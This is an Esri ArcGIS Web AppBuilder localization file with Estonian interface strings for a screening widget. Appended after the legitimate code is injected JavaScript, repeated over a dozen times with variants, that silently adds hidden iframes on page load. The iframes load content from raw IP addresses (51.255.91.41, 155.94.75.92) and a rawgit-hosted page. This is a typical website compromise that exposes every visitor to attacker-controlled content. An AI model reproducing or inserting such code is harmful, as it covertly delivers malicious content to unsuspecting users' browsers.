// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/nls/strings":{_widgetLabel:"S\u00f5elumine",geometryServicesNotFound:"Geomeetriateenus pole saadaval.",unableToDrawBuffer:"Puhvrit ei saa t\u00f5mmata. Proovige uuesti.",invalidConfiguration:"Sobimatu konfiguratsioon",clearAOIButtonLabel:"Alusta uuesti",noGraphicsShapefile:"\u00dcleslaetud Shape-failis pole graafikat.",zoomToLocationTooltipText:"Suumi asukohta",noGraphicsToZoomMessage:"Sissesuumimiseks ei leitud graafikat.",placenameWidget:{placenameLabel:"Asukoha otsimine"},
drawToolWidget:{useDrawToolForAOILabel:"Valige joonistusre\u017eiim",toggleSelectability:"Kl\u00f5psake valitavuse\u00a0sisse-ja v\u00e4ljal\u00fclitamiseks",chooseLayerTitle:"Vali valitav kiht",selectAllLayersText:"Vali k\u00f5ik",layerSelectionWarningTooltip:"AOI loomiseks peab olema valitud v\u00e4hemalt \u00fcks kiht"},shapefileWidget:{shapefileLabel:"Laadi \u00fcles pakitud Shape-fail",uploadShapefileButtonText:"Laadi \u00fcles",unableToUploadShapefileMessage:"Shape-faili ei saa \u00fcles laadida."},
coordinatesWidget:{selectStartPointFromSearchText:"M\u00e4\u00e4rake alguspunkt",addButtonTitle:"Lisa",deleteButtonTitle:"Eemalda",mapTooltipForStartPoint:"Alguspunkti m\u00e4\u00e4ramiseks kl\u00f5psake kaardil",mapTooltipForUpdateStartPoint:"Alguspunkti v\u00e4rskendamiseks kl\u00f5psake kaardil",locateText:"Paiguta",locateByMapClickText:"Valige algkoordinaadid",enterBearingAndDistanceLabel:"Sisestage kurss ja vahemaa alguspunktist",bearingTitle:"Kurss",distanceTitle:"Vahemaa",planSettingTooltip:"Plaani seaded",
invalidLatLongMessage:"Sisestage kehtivad v\u00e4\u00e4rtused."},bufferDistanceAndUnit:{bufferInputTitle:"Puhvri ulatus\u00a0(valikuline)",bufferInputLabel:"Kuva tulemused j\u00e4rgmise kohta"},traverseSettings:{bearingLabel:"Kurss",lengthLabel:"Pikkus",addButtonTitle:"Lisa",deleteButtonTitle:"Eemalda"},planSettings:{expandGridTooltipText:"Laienda ruudustik",collapseGridTooltipText:"Ahenda ruudustik",directionUnitLabelText:"Juhiste \u00fchik",distanceUnitLabelText:"Vahemaa ja pikkuse \u00fchikud",
planSettingsComingSoonText:"Varsti k\u00e4ttesaadav"},newTraverse:{invalidBearingMessage:"Vigane kurss.",invalidLengthMessage:"Vigane pikkus.",negativeLengthMessage:"Negatiivne pikkus"},reportsTab:{aoiAreaText:"AOI pindala",downloadButtonTooltip:"Allalaadimine",printButtonTooltip:"Prindi",uploadShapefileForAnalysisText:"Laadi \u00fcles Shape-fail anal\u00fc\u00fcsis kaasamiseks",uploadShapefileForButtonText:"Sirvi",downloadLabelText:"Vali formaat:",downloadBtnText:"Allalaadimine",noDetailsAvailableText:"Tulemusi ei leitud",
featureCountText:"Koguarv",featureAreaText:"Pindala",featureLengthText:"Pikkus",attributeChooserTooltip:"Valige kuvatavad atribuudid",csv:"CSV",filegdb:"Faili geoandmebaas",shapefile:"Shape-fail",noFeaturesFound:"Valitud failiformaadi jaoks pole tulemusi",selectReportFieldTitle:"Vali v\u00e4ljad",noFieldsSelected:"\u00dchtegi v\u00e4lja pole valitud",intersectingFeatureExceedsMsgOnCompletion:"\u00dche v\u00f5i enama kihi puhul on \u00fcletatud maksimaalne kirjete arv.",unableToAnalyzeText:"Ei saa anal\u00fc\u00fcsida, maksimaalne kirjete arv on \u00fcletatud.",
errorInPrintingReport:"Aruannet ei saa printida. Kontrollige, kas aruande seaded on \u00f5iged.",aoiInformationTitle:"Huviala (AOI) info",summaryReportTitle:"Kokkuv\u00f5te",notApplicableText:"P/S",downloadReportConfirmTitle:"Kinnitage allalaadimine",downloadReportConfirmMessage:"Kas soovite kindlasti alla laadida?",noDataText:"Andmed puuduvad",createReplicaFailedMessage:"J\u00e4rgmiste kihtide allalaadimine nurjus : \x3cbr/\x3e ${layerNames}",extractDataTaskFailedMessage:"Allalaadimine nurjus.",
printLayoutLabelText:"Paigutus",printBtnText:"Prindi",printDialogHint:"M\u00e4rkus: aruande pealkirja ja kommentaare saab redigeerida aruande eelvaates.",unableToDownloadFileGDBText:"Faili geoandmebaasi ei saa punkt- v\u00f5i joonasukohti sisaldava AOI jaoks alla laadida",unableToDownloadShapefileText:"Shape-faili ei saa punkt- v\u00f5i joonasukohti sisaldava AOI jaoks alla laadida",analysisUnitLabelText:"Kuva tulemid:",analysisUnitButtonTooltip:"Vali anal\u00fc\u00fcsimiseks \u00fcksused",analysisCloseBtnText:"Sule",
feetUnit:"Jalad / ruutjalad",milesUnit:"Miilid / aakrid",metersUnit:"Meetrid / ruutmeetrid",kilometersUnit:"Kilomeetrid / ruutkilomeetrid",hectaresUnit:"Kilomeetrid / hektarid",hectaresAbbr:"hektarit",layerNotVisibleText:"Ei saa anal\u00fc\u00fcsida, sest kiht on v\u00e4lja l\u00fclitatud v\u00f5i asub v\u00e4ljaspool m\u00f5\u00f5tkava n\u00e4htavuse ulatust.",refreshBtnTooltip:"V\u00e4rskenda raportit"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});